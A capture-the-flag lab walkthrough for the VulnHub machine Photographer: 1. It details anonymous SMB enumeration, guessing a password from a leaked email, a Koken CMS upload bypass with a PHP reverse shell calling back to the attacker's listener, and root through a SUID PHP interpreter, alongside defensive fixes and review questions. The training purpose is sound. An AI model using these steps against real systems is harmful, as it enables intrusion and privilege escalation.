# Machine 11 — Photographer: 1

> **Position:** 11 of 13 · **Band 3 — Easy** (global rank **055** of 708)
> **Full writeup:** [`labs/3-055-photographer-1/README.md`](../../labs/3-055-photographer-1/README.md)

| | |
| --- | --- |
| **Machine** | Photographer: 1 |
| **Author** | Vinícius Vieira ("v1n1v131r4") |
| **Released** | 21 July 2020 |
| **Target** | Ubuntu 16.04 (EOL) — Apache 2.4.18, Samba 4.3.11, **Koken CMS 0.22.24**, PHP 7.2 |
| **VulnHub** | [entry/photographer-1,519](https://vulnhub.com/entry/photographer-1,519/) |
| **Flags** | 2 — `/home/daisa/user.txt`, `/root/proof.txt` |
| **Estimated time** | 4–6 hours |

---

## Why this machine is here

Because it starts **away from the web server entirely**. The foothold is not a
vulnerability in code — it is an **anonymous SMB share containing real company
correspondence**, and the credential you need is not in any wordlist. It is *implied
by an email*:

> *"Don't forget your secret, my babygirl ;)"*

That teaches a skill no other box in this path does: **reading leaked documents for
what they imply, not just what they state.** Real breach investigations are full of
this — an attachment, a ticket, a forwarded email, and a password that nobody would
ever have guessed from a list.

It then gives you a **CMS upload bypass with a public Exploit-DB entry** (Koken
0.22.24, EDB **48706**) that requires **Burp Suite interception** to mutate the
request mid-flight, and finishes with SUID on a **PHP interpreter** — a binary you
would not think to check.

## Learning objectives

1. Enumerate SMB properly and interpret **`READ ONLY`** vs **`NO ACCESS`** in
   `smbmap` output.
2. Download and analyse files from an **anonymous share** — and know what to look for.
3. **Infer a credential** from an informal email rather than cracking one.
4. **Fingerprint a CMS from an HTTP response header** (`http-generator: Koken 0.22.24`).
5. Understand **client-side-only upload validation** and why it is not a control.
6. Use **Burp Suite** to intercept and modify a request in flight.
7. **Locate an uploaded file** by reading the application's own UI and its storage
   conventions.
8. Escalate via **SUID PHP**, and understand the critical **`-p`** flag.
9. Read `id` output to distinguish **real UID** from **effective UID**.

## Attack classes covered

| Class | Where on this box |
| --- | --- |
| **Anonymous SMB share with real correspondence** | `sambashare` on :445 → `mailsent.txt`, `wordpress.bkp.zip` (12 MB) |
| SMB signing disabled | Samba 4.3.11 → relay exposure |
| **Credential inference from a leaked email** | *"my babygirl"* → password **`babygirl`** |
| Admin panel exposed to the network | `:8000/admin/` |
| **CMS arbitrary file upload** | Koken **0.22.24**, Exploit-DB **48706** — client-side extension check only |
| Request tampering | **Burp Suite** interception to strip `.jpg` from `shell.php.jpg` |
| Uploads inside the document root | `/storage/originals/…/shell.php` → executes on request |
| Verbose disclosure headers | `http-generator`, `X-Powered-By` → exact CMS and PHP versions |
| **Credential reuse: CMS password = system password** | `daisa` / `babygirl` → user flag |
| **SUID on a PHP interpreter** | `/usr/bin/php7.2` mode **`4755`** → `euid=0` |
| No sandboxing | Apache/PHP with no enforced AppArmor profile |
| EOL operating system | Ubuntu 16.04 |

## Read first

- [03 — Service and Network Attacks](../03-Service-and-Network-Attacks.md) **§2** —
  SMB enumeration, and the "what to hunt for inside shares" list.
- [02 — Web Attacks](../02-Web-Attacks.md) **§6** (file upload → web shell, including
  the bypass table) and §7 (CMS notes).
- [04 — Credentials and Cracking](../04-Credentials-and-Cracking.md) **§5** —
  credential reuse, and the "where credentials hide" table.
- [05 — Linux Privilege Escalation](../05-Linux-Privilege-Escalation.md) **§2** (SUID).

## Before you start — answer these

1. What does `smbmap` mean by `READ ONLY` on a share, and is that enough for an
   attacker?
2. An email says *"Don't forget your secret, my babygirl ;)"*. What is your password
   candidate list, and in what order?
3. A CMS advertises itself in an HTTP response header. Why is that a finding, and what
   do you do with the information?
4. What is **client-side** validation, and why can an attacker ignore it completely?
5. What does the `-p` flag do when you spawn a shell from a SUID binary?

## Hints ladder

<details>
<summary><strong>Rung 1 — a nudge</strong></summary>

Scan all ports:

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
```

You should see **80**, **139**, **445** and **8000**. Two things to do immediately:

1. Read the **response headers** on port 8000 — one of them names a CMS *and its exact
   version*.
2. Try **anonymous** access to the SMB shares. No credentials.
</details>

<details>
<summary><strong>Rung 2 — the share</strong></summary>

```bash
smbmap -H TARGET
smbclient //TARGET/sambashare -N
smb: \> ls
smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
```

Two files: **`mailsent.txt`** (503 bytes) and **`wordpress.bkp.zip`** (~12 MB).

Read the email closely:

```text
To: Daisa Ahomi <daisa@photographer.com>
...
Your site is ready now.
Don't forget your secret, my babygirl ;)
```

Three things fall out of that: the **login identifier** is an *email address* (Koken
admins log in with an email, not a username); Daisa **owns** the site on port 8000;
and the password hint is the emphasised word — **`babygirl`**.

Candidates, in order: `babygirl`, `babygirl;`, `Babygirl`, `babygirl2020`, `daisa`,
`daisaahomi`, `secret`.

Also inspect the backup: `unzip -l wordpress.bkp.zip | head`, and
`unzip -p wordpress.bkp.zip wordpress/wp-config.php | grep -i password`.
</details>

<details>
<summary><strong>Rung 3 — the CMS and the upload</strong></summary>

`curl -sI http://TARGET:8000/` returns **`http-generator: Koken 0.22.24`**. The
admin panel is at **`http://TARGET:8000/admin/`**. Log in with
**`daisa@photographer.com : babygirl`**.

Now the upload. `searchsploit koken` → **EDB 48706**, *Koken CMS 0.22.24 — Arbitrary
File Upload (Authenticated)*. The extension check happens **in the browser's
JavaScript**, so a proxy that edits the request after the browser sends it defeats it
completely:

1. Set your browser's proxy to **Burp Suite** (`127.0.0.1:8080`), turn **Intercept
   on**.
2. In Koken, use **Import Content** to upload a file named **`shell.php.jpg`**
   containing a PHP reverse shell.
3. Burp stops the request. **Delete the `.jpg`** so the filename is `shell.php`.
4. Forward it.

Then find where it landed — read the UI's own link, or use the storage convention
`storage/originals/`.
</details>

<details>
<summary><strong>Rung 4 — shell, user flag, root</strong></summary>

Start `nc -lvnp 4444` **first**, then request the uploaded file. You land as
**`www-data`** (uid=33). Upgrade the TTY.

`/home/daisa/user.txt` is `-rw-------` owned by `daisa`, so `www-data` cannot read it.
But the **CMS password is reused as the system password**:

```bash
su daisa          # babygirl
cat /home/daisa/user.txt
```

Root:

```bash
find / -perm -4000 -type f 2>/dev/null
# /usr/bin/php7.2   <- an interpreter, SUID root, mode 4755
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
id      # euid=0(root)
cat /root/proof.txt
```

**`-p` is essential** — without it the shell drops the SUID privileges and you stay
`daisa`.
</details>

<details>
<summary><strong>Rung 5 — the answer</strong></summary>

1. `nmap -p-` → **80**, **139**, **445**, **8000** (Apache 2.4.18, title
   `daisa ahomi`).
2. `smbmap -H TARGET` → anonymous share **`sambashare`** (`READ ONLY`); SMB signing
   **disabled**.
3. `smbclient //TARGET/sambashare -N` → **`mailsent.txt`** and
   **`wordpress.bkp.zip`**.
4. The email is from **agi** to **daisa@photographer.com** and ends *"Don't forget
   your secret, my babygirl ;)"* → password **`babygirl`**.
5. Port **8000** header `http-generator: Koken 0.22.24`; admin at `/admin/`; log in
   as `daisa@photographer.com : babygirl`.
6. **EDB 48706**: upload `shell.php.jpg`, **intercept in Burp, strip `.jpg`** →
   lands in `/storage/originals/…/shell.php`.
7. Trigger it → **`www-data`** → TTY upgrade.
8. **Credential reuse:** `su daisa` with `babygirl` → **`/home/daisa/user.txt`**.
9. `find / -perm -4000` → **`/usr/bin/php7.2` mode `4755`** →
   `php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"` → **euid=0** → **`/root/proof.txt`**.
</details>

## After you finish — review questions

1. How did you get the password without cracking anything? Why is that *more*
   worrying for the defender than a weak password?
2. `smbmap` said `READ ONLY`. Why was read access alone enough to compromise the
   entire machine?
3. The extension check was in JavaScript. What exactly does that mean about who
   enforces it, and what is the minimum server-side change that would fix it?
4. Why did you need Burp rather than `curl` here? Could you have done it with `curl`?
   Write the command.
5. How did you find the uploaded file's path? Name two independent methods.
6. Why did `pcntl_exec('/bin/sh', ['-p'])` work when `/bin/sh` alone would not?
7. The CMS password equalled the system password. What single policy stops that?
8. Ubuntu 16.04 is EOL. Combined with the missing AppArmor profile, what is the
   compounding effect?

## Defensive reflection

| Finding | Fix |
| --- | --- |
| **Anonymous SMB share with correspondence** | Disable anonymous/guest access; require authentication on every share; audit shares quarterly |
| SMB signing disabled | `server signing = mandatory` in `smb.conf`; blocks relay attacks |
| Email leaked with a password hint | Data-loss prevention on file shares; user awareness training; never write credential hints in shared documents |
| **`babygirl` as a password** | Enforce length + a breached-password check; require MFA on the CMS admin |
| Admin panel reachable from the network | Bind `:8000/admin/` to localhost or a management VLAN; require VPN |
| **Client-side-only upload validation (EDB 48706)** | Validate server-side: extension **allow-list**, MIME **and** content check, and **re-encode** images (which strips appended PHP). Upgrade the CMS |
| Uploads stored in the document root with the attacker's extension | Store outside the web root; serve with `Content-Disposition: attachment`; disable the PHP engine for that directory |
| `http-generator` / `X-Powered-By` disclose versions | Suppress them — but note that suppression only slows an attacker; the real fix is upgrading |
| **CMS password = system password** | Unique credentials per service; a secrets manager; alert on credential overlap |
| **SUID root on `/usr/bin/php7.2`** | `chmod u-s`. An SUID interpreter is root for anyone who can run it. Audit SUID against the stock set |
| No AppArmor profile for Apache/PHP | Enforce a confinement profile so a compromised `www-data` cannot read broadly |
| Ubuntu 16.04 (EOL) | Upgrade. This is the root cause behind several findings |

**The single biggest lesson:** *people write down their secrets.* The vulnerability
here was not in Koken, not in Samba and not in PHP — it was an email on an open file
share. Technical controls matter, but so does the human layer, and it is usually
weaker.

---

## The commands, annotated — every input and every output

Published walkthroughs use `192.168.56.122` for the target and `192.168.56.10` for Kali.

### 1. Scan

```bash
sudo nmap -sC -sV -p- -T4 -oN scans/photographer.txt TARGET
```

```text
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: Photographer by v1n1v131r4
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-title: daisa ahomi
| http-robots.txt: 1 disallowed entry
|_/admin/
Service Info: Host: PHOTOGRAPHER
```

Two web servers, **two different sites**. Port 80 is a static portfolio; port 8000 is an
application — and the NSE `http-robots.txt` script has already read its `robots.txt` for you and
printed the single disallowed entry: **`/admin/`**. `-p-` mattered: an application on 8000 with
nothing interesting on 80 is a very common CTF shape, and a default scan invites you to give up.

### 2. SMB: anonymous share first

```bash
smbmap -u guest -H TARGET
smbclient -L //TARGET -N
```

```text
[+] Guest session       IP: 192.168.56.122:445    Name: 192.168.56.122
        Disk                                    Permissions     Comment
        ----                                    -----------     -------
        print$                                  NO ACCESS       Printer Drivers
        sambashare                              READ ONLY       Samba on Ubuntu
        IPC$                                    NO ACCESS       IPC Service
```

`smbmap` is the fastest first look because its **`Permissions`** column answers the only
question that matters — can you read it, and can you write to it? `-u guest -H` means "a guest
session, no password". `smbclient -L … -N` lists shares with a NULL session (`-N` = no
credentials).

```bash
smbclient //TARGET/sambashare -N
smb: \> dir
smb: \> get mailsent.txt
smb: \> get wordpress.bkp.zip
smb: \> exit
cat mailsent.txt
```

```text
  mailsent.txt                        N      503  Tue Jul 21 03:29:40 2020
  wordpress.bkp.zip                   N 12666609  Tue Jul 21 03:30:07 2020
```
```text
Message-ID: <4129F3CA.2020509@dc.edu>
From: Agi Clarence <agi@photographer.com>
To: Daisa Ahomi <daisa@photographer.com>
Subject: To Do - Daisa Website's
Content-Type: text/plain; charset=us-ascii;

Hi Daisa!
Your website is ready. Login with your email and your password.
Don't forget your password is your babygirl's name :)
-- Agi
```

`get FILE` downloads into your current directory; `prompt` toggles the per-file confirmation;
`recurse` plus `mget *` would fetch a whole tree.

Read that email as the entire foothold. It hands you **two email addresses**, tells you the
admin **logs in with an email address rather than a username**, and states the password is
*"your babygirl's name"*. That is a **password hint**, and it is why the guess list is short and
thematic rather than a 14-million-line dictionary. **Never put company correspondence on a
share reachable by guests** — data classification matters more than any single technical
control.

### 3. The decoy backup

```bash
unzip -l wordpress.bkp.zip | head -20
unzip -p wordpress.bkp.zip wordpress/wp-config.php 2>/dev/null | grep -i 'define\|password'
```

```text
Archive:  wordpress.bkp.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     5434  2020-07-20 12:11   wordpress/wp-config-sample.php
   405431  2020-07-20 12:11   wordpress/wp-admin/edit.php
```
```text
(no wp-config.php in the archive — only the stock sample)
```

A 12 MB WordPress backup on an anonymous share *looks* like a jackpot. `-l` lists contents
without extracting (fast, and avoids writing 12 MB of files you do not need); `-p FILE` prints
one member to stdout so you can grep it directly. **There is no `wp-config.php` — only the stock
sample.** Two lessons: always inspect a backup's *contents* before assuming it leaks
credentials, and note that real backups routinely do contain `wp-config.php`, `.env`, `id_rsa`
and `*.sql`, so this is still a finding-grade exposure.

### 4. Fingerprint the application

```bash
curl -s http://TARGET:8000/ | grep -io 'koken[^"]*\|<title>[^<]*</title>\|href="[^"]*"' | head -20
curl -sI http://TARGET:8000/admin/
```

```text
<title>daisa ahomi</title>
href="/admin/"
href="storage/originals/"
Koken 0.22.24
```
```text
HTTP/1.1 200 OK
Server: Apache/2.4.18 (Ubuntu)
X-Powered-By: PHP/7.2.24-0ubuntu0.16.04.2
Set-Cookie: koken_session_ci=...; path=/; HttpOnly
```

**Version first, research second.** `Koken 0.22.24` plus PHP `7.2.24` on Ubuntu 16.04. The
`koken_session_ci` cookie confirms the framework, and `storage/originals/` is where uploads land
— remember that path.

```bash
searchsploit koken
searchsploit -m php/webapps/48706.txt && cat 48706.txt
```

```text
# Exploit Title: Koken CMS 0.22.24 - Arbitrary File Upload
# Version: 0.22.24
# Tested on: Ubuntu 16.04

Description:
Koken CMS allows authenticated administrators to import content. The import
function checks the file extension on the CLIENT side ...
```

**The version matches exactly**, which is what makes EDB-48706 applicable rather than merely
similar. `-m` mirrors the entry into your working directory; read it before acting. The key
sentence is *"checks the file extension on the **CLIENT** side"* — meaning the browser's
JavaScript rejects `.php`, but **the server does not**. That tells you the fix is not a clever
filename: it is to send what the browser refused to send, which means an intercepting proxy.

### 5. Log in with the inferred credential

`http://TARGET:8000/admin/` → email `daisa@photographer.com`, password `babygirl`.

```text
Welcome back, Daisa.
```

If `babygirl` had not worked, the correct escalation is a **thematic** list, not a bigger one:

```bash
cewl -d 2 -m 3 -w daisa_words.txt http://TARGET:8000/
printf '%s\n' babygirl Babygirl BABYGIRL 'babygirl;' daisa Daisa daisaahomi 'babygirl2020' secret 'mybabygirl' >> daisa_words.txt
sort -u daisa_words.txt -o daisa_words.txt
```

`cewl -d 2 -m 3` harvests words of three or more characters from two hops of the site — exactly
the vocabulary an author who themed a box around a family would use. The appended variants are
the standard transformations (case, punctuation, year, compound). `sort -u … -o` de-duplicates
in place safely.

### 6. Upload, intercept, mutate

Prepare the shell:

```bash
cp /usr/share/webshells/php/php-reverse-shell.php ./shell.php
sed -i "s/127.0.0.1/ATTACKER/" shell.php
sed -i "s/1234/4444/" shell.php
grep -nE '^\$(ip|port)' shell.php
cp shell.php shell.php.jpg
ls -l shell.php*
```

```text
52:$ip = '192.168.56.10';  // CHANGE THIS
53:$port = 4444;           // CHANGE THIS
```
```text
-rw-r--r-- 1 kali kali 5493 May  4 14:18 shell.php
-rw-r--r-- 1 kali kali 5493 May  4 14:20 shell.php.jpg
```

Identical sizes confirm `shell.php.jpg` is a copy, not a truncated one. **The `grep` is the
verification step** — uploading a shell with an unedited `$ip` fails silently and looks like a
networking problem.

In the Koken admin panel choose **Library → Import content**, start Burp's intercept, upload
`shell.php.jpg`, then in the intercepted request change the filename:

```http
Content-Disposition: form-data; name="files[]"; filename="shell.php.jpg"
```
→
```http
Content-Disposition: form-data; name="files[]"; filename="shell.php"
```

Forward it. The **client-side check has already run** (in the browser, before the request left
your machine), so the server receives a `.php` filename it never validated.

```http
HTTP/1.1 200 OK
Content-Type: application/json

{"id":17,"title":"shell","filename":"shell.php","storage":{...}}
```

```text
http://TARGET:8000/storage/originals/3c/13/shell.php
```

Read the JSON response as your confirmation: `filename` is the server's own record of what it
stored, and `storage` reveals the **two-level hashed directory** (`3c/13/`) Koken puts files in.
If the response does not give you the path, find it:

```bash
gobuster dir -u http://TARGET:8000/storage/originals/ \
  -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -t 50 -q 2>/dev/null | head
```

### 7. Trigger, and read the shell banner

```bash
nc -lvnp 4444                                  # Kali, first
curl -s http://TARGET:8000/storage/originals/3c/13/shell.php
```

```text
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.56.122.
Linux photographer 4.4.0-178-generic #208-Ubuntu SMP ... x86_64 GNU/Linux
sh: 0: can't access tty; job control turned off
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

**Why merely visiting the URL executed PHP:** Apache's handler mapping says "run `*.php` through
the PHP interpreter", and `storage/originals/` is inside the document root with no override
disabling it. Upload plus execute-in-place is the two halves of every file-upload RCE.

Read the banner line by line: `4.4.0-178-generic … x86_64` → Ubuntu 16.04, 64-bit, kernel from
April 2020 — **reasonably patched**, so kernel exploits are unlikely and you should expect a
*configuration* escalation. `sh: 0: can't access tty` is normal for a bare reverse shell.

Upgrade: `python3 -c 'import pty; pty.spawn("/bin/bash")'`, `Ctrl+Z`, `stty raw -echo; fg`,
`export TERM=xterm; stty rows 40 cols 160`.

### 8. The user flag is a real boundary

```bash
ls -la /home/daisa/
cat /home/daisa/user.txt
```

```text
-rw------- 1 daisa daisa 38 Jul 21 03:44 user.txt
cat: /home/daisa/user.txt: Permission denied
```

`-rw-------` owned by `daisa` — **`www-data` cannot read it.** That is not decoration; it is the
box telling you to escalate. Two ways forward: reuse the Koken password (`su daisa` with
`babygirl` — CMS-to-system credential reuse is the single most common lateral movement on real
engagements), or skip straight to root and read it from there.

### 9. The checklist, and why it points at SUID

```bash
sudo -l
cat /etc/crontab; ls -la /etc/cron.d/ /etc/cron.*
uname -r
```

```text
sudo: command not found
no crontab for www-data
4.4.0-178-generic
```

No sudo, all-default cron, kernel patched to April 2020 (Dirty COW and overlayfs both long
fixed). So the remaining vector is **SUID**:

```bash
find / -perm -u=s -type f 2>/dev/null
ls -l /usr/bin/php7.2
```

```text
/usr/bin/chsh
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/chfn
/usr/bin/mount
/usr/bin/su
/usr/bin/umount
/usr/bin/passwd
/usr/bin/php7.2
```
```text
-rwsr-xr-x 1 root root 4538528 Jan 14  2020 /usr/bin/php7.2
```

`-perm -u=s` means "the user-SUID bit is set" (the leading `-` makes it a *subset* match, so it
also catches SGID); `-type f` restricts to regular files; `2>/dev/null` discards the thousands
of `Permission denied` errors that would otherwise bury the answer. **Compare against the stock
baseline** so the odd entry jumps out — everything above `php7.2` is default Ubuntu.

`-rwsr-xr-x` with owner `root`: somebody ran `chmod u+s /usr/bin/php7.2`. That is not a package
default.

### 10. Escalate

```bash
/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);"
id
cat /home/daisa/user.txt
cat /root/proof.txt
```

```text
uid=33(www-data) gid=33(www-data) euid=0(root) egid=0(root) groups=33(www-data)
```

**Dissect the command — every part is load-bearing.**

| Piece | Meaning |
| --- | --- |
| `/usr/bin/php7.2` | the **absolute path**. Bare `php -r …` may resolve to a different, non-SUID PHP |
| `-r "code"` | run PHP code directly, no file needed |
| `pcntl_exec('/bin/sh', …)` | PHP's **process-control** function: replaces the current process image with `/bin/sh`, so the new shell **inherits** the effective UID rather than being spawned as a child |
| `['-p']` | privileged mode — **mandatory** |

**Forgetting `-p` is the number-one mistake on this box.** Bash deliberately drops its effective
UID at startup unless invoked with `-p`; without it you get a `$` prompt and conclude wrongly
that the escalation failed.

**Read `id` correctly:** `uid=33(www-data)` is your *real* UID, unchanged; **`euid=0(root)`** is
your *effective* UID, and that is what the kernel consults for permission checks. This is a SUID
elevation, not a login — which matters for auditing, because the original identity is still
recorded.

| Flag | Location | Value |
| --- | --- | --- |
| **User** | `/home/daisa/user.txt` | `{USER-FLAG: …}` |
| **Root** | `/root/proof.txt` | `{ROOT-FLAG: …}` |

> ### 📖 The rule to carry away
>
> **Remove SUID from interpreters — always.** `php`, `python`, `perl`, `ruby`, `node`, `bash`,
> `vim`, `less`, `tar`, `find` and `awk` must never carry the setuid bit. An interpreter is a
> full programming language: it can read and write any file, spawn processes and open sockets.
> Handing any local user a SUID-root interpreter is handing them root. Detect drift against a
> baseline — `find / -perm -4000 -type f` diffed weekly, or `aide`, `osquery`
> (`SELECT * FROM suid_bin`) and Wazuh automatically. A new SUID file appearing should page
> someone immediately.

---

_Back to [Learning Path 1](../README.md) · previous: [Machine 10 — PwnLab: init](10-pwnlab-init.md) · next: [Machine 12 — symfonos: 1](12-symfonos-1.md) · full writeup: [`labs/3-055-photographer-1`](../../labs/3-055-photographer-1/README.md)._
